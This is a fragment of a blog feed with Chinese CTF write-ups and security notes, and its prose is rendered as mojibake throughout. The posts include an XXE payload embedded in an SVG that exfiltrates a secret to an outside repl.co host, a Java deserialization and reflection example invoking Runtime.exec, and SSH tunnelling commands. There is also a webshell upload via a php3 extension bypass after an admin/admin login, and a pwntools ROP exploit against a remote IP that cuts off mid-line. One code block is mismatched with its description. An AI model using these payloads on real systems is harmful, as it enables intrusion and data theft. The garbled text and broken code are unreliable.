href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg">PayloadsAllTheThings</a>ä¸Šé¢æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=https://flaaaaaaaag.cubestone.com/?secret=demo&quot;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY send SYSTEM &#x27;https://xxe.f4l1k.repl.co/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>å†å°†svgçš„xmlä¸Šä¼ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxe.f4l1k.repl.co/exp.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;%payload;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;send;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210623122407638.png" alt="image-20210623122407638"></p><p>æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°æºç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script &gt;</span><br><span class="line"><span class="built_in">document</span>.domain=<span class="string">&quot;cubestone.com&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pageload</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.innerText=data;</span><br><span class="line">&#125;</span><br><span class="line">fetch(<span class="string">`loader.php?callback=pageload&amp;secret=demo`</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;<span class="keyword">return</span> res.text();&#125;).then(<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;<span class="built_in">eval</span>(data);&#125;)&lt;/script</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°è¯•å»è®¿é—®ä¸€ä¸‹<code>loader.php?callback=pageload&amp;secret=demo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageload(&#x27;Control center access require a vaild secret key. You entered a invaild secret!&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢javaååºåˆ—åŒ–</title>
      <link href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>javaåºåˆ—åŒ–æ˜¯æŒ‡å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµçš„è¿‡ç¨‹ï¼ˆObjectOutStreamä¸­çš„writeObject()æ–¹æ³•ï¼‰</p><p>javaååºåˆ—åŒ–å°±æ˜¯å°†å­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ï¼ˆObjectInputStreamé‡çš„readObject()æ–¹æ³•ï¼‰</p><p>åºåˆ—åŒ–å¯¹è±¡ç±»å¿…é¡»å®ç°java.io.Serializableæ¥å£ï¼Œå¹¶ä¸”æ‰€æœ‰å±æ€§çš„éƒ½æ˜¯å¯åºåˆ—è¯çš„</p><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><h3 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUser</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Userç±»ç»§æ‰¿äº†Serializableæ¥å£</p><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setUser(<span class="string">&quot;f4l1K&quot;</span>);</span><br><span class="line">        FileOutputStream file = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;f4liK.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(file);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        User user1 = (User) unSerializ();</span><br><span class="line">        System.out.println(user1.getUser());</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unSerializ</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        FileInputStream file =  <span class="keyword">new</span> FileInputStream(<span class="string">&quot;f4liK.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(file);</span><br><span class="line">        <span class="keyword">return</span> input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f4liKä¸­å°±æ˜¯æˆ‘ä»¬åºåˆ—åŒ–çš„</p><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319162908083.png" alt="image-20210319162908083"></p><ul><li><code>0xaced</code> é­”æœ¯å¤´</li><li><code>0x0005</code> åºåˆ—åŒ–æ ¼å¼ç‰ˆæœ¬å·</li><li><code>0x73</code> ä»£è¡¨æ¥ä¸‹ä»£è¯»å–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡</li><li><code>0x72</code> ä»£è¡¨è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªå¯¹ç±»çš„æè¿°</li><li><code>0x0009</code> æŒ‡è¯¥ç±»æè¿°ä¿¡æ¯é•¿åº¦ï¼Œåˆšå¥½ä¸ºDemo.Useré•¿åº¦</li><li><code>0x70eea382105b0d9b4</code> serialVserionUID(åºåˆ—ç‰ˆæœ¬å”¯ä¸€æ ‡è¯†ï¼Œç®€ç§°SUID)</li><li><code>0x02</code>     å¯¹è±¡åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½</li><li><code>0x0001</code> ç±»çš„å­—æ®µä¸ªæ•°</li><li><code>0x4c</code> L,å³ä»£è¡¨å¯¹è±¡</li><li><code>0x0004</code> ä¾æ—§ä»£è¡¨é•¿åº¦ï¼Œä¸Userå¯¹åº”</li></ul><p>åˆ©ç”¨ObjectInputStreamä¸­read.Objectå³å¯è¯»å‡ºåºåˆ—åŒ–å†…å®¹</p><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319163419406-5674818.png" alt="image-20210319163419406"></p><h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p>å½“æˆ‘ä»¬åºåˆ—è¯å¯¹è±¡çš„ç±»é‡å†™äº†readObject()æ–¹æ³•ï¼Œæˆ‘ä»¬å†æ¬¡ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨é‡å†™çš„readObject()æ–¹æ³•ï¼Œæˆ‘ä»¬ç”¨ä¸ªä¾‹å­è¯´æ˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">highlight_file(__FILE__);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é‡å†™çš„readObjectä¸­ä¼šè°ƒç”¨è®¡ç®—å™¨ï¼Œæˆ‘ä»¬åºåˆ—åŒ–è¯¥ç±»å¯¹è±¡å¹¶ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Testse test=<span class="keyword">new</span> Testse();</span><br><span class="line">        FileOutputStream file = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;f4l1K.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(file);</span><br><span class="line">        out.writeObject(test);</span><br><span class="line">        out.close();</span><br><span class="line">        unSerializ();</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unSerializ</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        FileInputStream file =  <span class="keyword">new</span> FileInputStream(<span class="string">&quot;f4l1K.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(file);</span><br><span class="line">        <span class="keyword">return</span> input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319164349339.png" alt="image-20210319164349339"></p><p>æ‰€ä»¥readObject()å¦‚æœä¹¦å†™ä¸å½“ã€‚å°±å¯èƒ½ä¼šå¼•èµ·ååºåˆ—åŒ–æ¼æ´</p><p>ä½†å®é™…æƒ…å†µä¸‹ä¸ä¼šå¦‚æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©javaçš„åå°„ç‰¹æ€§</p><h2 id="javaåå°„"><a href="#javaåå°„" class="headerlink" title="javaåå°„"></a>javaåå°„</h2><p>Javaåå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶</p><p>Java åå°„ä¸»è¦æä¾›ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ul><li>åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ï¼›</li><li>åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼›</li><li>åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼ˆé€šè¿‡åå°„ç”šè‡³å¯ä»¥è°ƒç”¨privateæ–¹æ³•ï¼‰ï¼›</li><li>åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•</li></ul><blockquote><p>forName()â€“&gt;è·å–ç±»å¯¹è±¡</p><p>getConstructor()â€“&gt;è·å¾—è¯¥ç±»ä¸­ä¸å‚æ•°ç±»å‹åŒ¹é…çš„å…¬æœ‰æ„é€ æ–¹æ³•</p><p>newInstance()â€“&gt;åˆ›å»ºæ„é€ æ–¹æ³•çš„å®ä¾‹</p><p>getDeclaredMethod()â€“&gt;è¿”å›æ‰€åœ¨ç±»æ–¹æ³•</p><p>Invoke()â€“&gt;è°ƒç”¨æ–¹æ³•</p><p>getDeclaredField()â€“&gt;è·å–ç±»å‚æ•°</p><p>setAccessible()â€“&gt;å¦‚æœå‚æ•°ä¸ºprivateéœ€è¦è®¾ç½®ä¸ºtrue</p><p>set()â€“&gt;è®¾ç½®å‚æ•°</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       User user1 = <span class="keyword">new</span> User(<span class="string">&quot;test&quot;</span>); <span class="comment">//å®ä¾‹åŒ–Userç±»</span></span><br><span class="line">         Class Userclass2 = user1.getClass();<span class="comment">//è·å–å®ä¾‹å¯¹è±¡çš„ç±»</span></span><br><span class="line">         System.out.println(Userclass2);</span><br><span class="line">         Class Userclass= Class.forName(<span class="string">&quot;Demo.User&quot;</span>);<span class="comment">//è·å–ç±»çš„å¯¹è±¡</span></span><br><span class="line">         System.out.println(Userclass);</span><br><span class="line">         Constructor con = Userclass.getConstructor(String.class);<span class="comment">//è·å–å¯¹è±¡çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">         System.out.println(con);</span><br><span class="line">         User user = (User) con.newInstance(<span class="string">&quot;hkk&quot;</span>);<span class="comment">//æ–°å»ºä¸€ä¸ªuserå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">         System.out.println(user);</span><br><span class="line">         Method method = Userclass.getDeclaredMethod(<span class="string">&quot;setUser&quot;</span>,String.class);<span class="comment">//è·å–ç±»æ–¹æ³•</span></span><br><span class="line">         System.out.println(method);</span><br><span class="line">         method.invoke(user,<span class="string">&quot;hktest&quot;</span>); <span class="comment">//ä½¿ç”¨userå¯¹è±¡çš„setUseræ–¹æ³•</span></span><br><span class="line">         Field field = Userclass.getDeclaredField(<span class="string">&quot;user&quot;</span>);<span class="comment">//è·å–userçš„å‚æ•°</span></span><br><span class="line">         System.out.println(field);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);<span class="comment">//è®¾ç½®priviteå‚æ•°å¯è®¿é—®</span></span><br><span class="line">         field.set(user,<span class="string">&quot;f4l1K&quot;</span>);<span class="comment">//è®¾ç½®userå‚æ•°</span></span><br><span class="line">         System.out.println(user.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319180807000.png" alt="image-20210319180807000"></p><h3 id="åˆ©ç”¨åå°„é“¾æ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨åå°„é“¾æ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨åå°„é“¾æ‰§è¡Œå‘½ä»¤"></a>åˆ©ç”¨åå°„é“¾æ‰§è¡Œå‘½ä»¤</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          Class exec = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); <span class="comment">//è·å–ç±»</span></span><br><span class="line">          Object method = exec.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="keyword">null</span>);<span class="comment">//è·å–ç±»ä¸­getRuntimeå‡½æ•°å¹¶è°ƒç”¨è¯¥æ–¹æ³•çš„å®ä¾‹</span></span><br><span class="line">          Object method1 =  exec.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(method,<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);<span class="comment">//è·å–execæ–¹æ³•å¹¶åœ¨methodå®ä¾‹ä¸­æ‰§è¡Œ</span></span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥ğŸ”—"><a href="#å‚è€ƒé“¾æ¥ğŸ”—" class="headerlink" title="å‚è€ƒé“¾æ¥ğŸ”—"></a>å‚è€ƒé“¾æ¥ğŸ”—</h2><p><a href="https://xz.aliyun.com/t/3847#toc-3">https://xz.aliyun.com/t/3847#toc-3</a></p><p><a href="https://xz.aliyun.com/t/6787">https://xz.aliyun.com/t/6787</a></p><p><a href="https://blog.csdn.net/lqzkcx3/article/details/79463450">https://blog.csdn.net/lqzkcx3/article/details/79463450</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sshéš§é“</title>
      <link href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/"/>
      <url>/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/</url>
      
        <content type="html"><![CDATA[<p>sshéš§é“å¸¸ç”¨å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-Cï¼šå‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦</span><br><span class="line">-f ï¼šå°†sshä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰çš„shellã€‚</span><br><span class="line">-Nï¼šå»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“çš„ä¼šè¯ï¼‰</span><br><span class="line">-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£</span><br><span class="line">-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘</span><br><span class="line">-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘</span><br><span class="line">-Dï¼šåŠ¨æ€è½¬å‘ï¼ˆsocksä»£ç†ï¼‰</span><br><span class="line">-Pï¼šæŒ‡å®šsshç«¯å£</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹ç«¯å£è½¬å‘"><a href="#è¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="è¿œç¨‹ç«¯å£è½¬å‘"></a>è¿œç¨‹ç«¯å£è½¬å‘</h3><blockquote><p> ssh -NfR remote-ip:remote-port:localhost:local-port root@remoteip</p></blockquote><p>è¿œç¨‹sshd_configéœ€è¦è®¾ç½®</p><blockquote><p>AllowTcpForwarding yes</p></blockquote><blockquote><p>GatewayPorts yes</p></blockquote><h3 id="socksä»£ç†"><a href="#socksä»£ç†" class="headerlink" title="socksä»£ç†"></a>socksä»£ç†</h3><blockquote><p> ssh -NfD [localhost]:port root@localhost</p></blockquote><p>å…ˆåœ¨æœ¬åœ°å®ç°socksä»£ç†ï¼Œå†å°†socksä»£ç†ç«¯å£é€šè¿‡éš§é“è¿æ¥åˆ°å…¬ç½‘</p><blockquote><p>ssh -NfR remote-ip:remote-port:localhost:socks-port root@remoteip</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HXB writeup</title>
      <link href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/"/>
      <url>/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„"><a href="#é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„" class="headerlink" title="é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„"></a>é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„</h3><p>ç›´æ¥ä¼ å‚file=phpinfoï¼Œflagè¢«å†™åˆ°ç¯å¢ƒå˜é‡</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img1.png" alt="img1"></p><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>æ‰«æç›®å½•æ‰«åˆ°/admin</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img2.png" alt="img2"></p><p>è®¿é—®åå¼±å¯†ç admin/adminç™»å½•</p><p>å‘ç°æœ‰?r=manageinfoé¡µé¢å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ–‡ä»¶åè¢«é™åˆ¶ï¼Œä¼ php3å³å¯ç»•è¿‡ï¼Œç„¶åantswordè¿æ¥</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img3.png" alt="img3"></p><h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2><h3 id="å¤å…¸ç¾"><a href="#å¤å…¸ç¾" class="headerlink" title="å¤å…¸ç¾++"></a>å¤å…¸ç¾++</h3><p>é¢˜ç›®è¯´æ˜¯ç»´å‰å°¼äºšå¯†ç ï¼Œç›´æ¥çˆ†ç ´å¯†é’¥å³å¯</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img4.png" alt="img4"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>æ ˆæº¢å‡ºï¼Œé€šè¿‡putsæ³„éœ²å‡½æ•°åœ°å€ï¼Œè®¡ç®—åç§»é‡å¾—åˆ°systemå‡½æ•°åœ°å€æ¥get shell</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.111.104.169&#x27;</span>,<span class="number">56706</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401213</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000401211</span></span><br><span class="line">ret_addr = <span class="number">0x4007C6</span></span><br><span class="line">scanf = <span class="number">0x004006A0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;interesting&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">p.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(<span class="number">0x40</span>) + p64(ret_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> 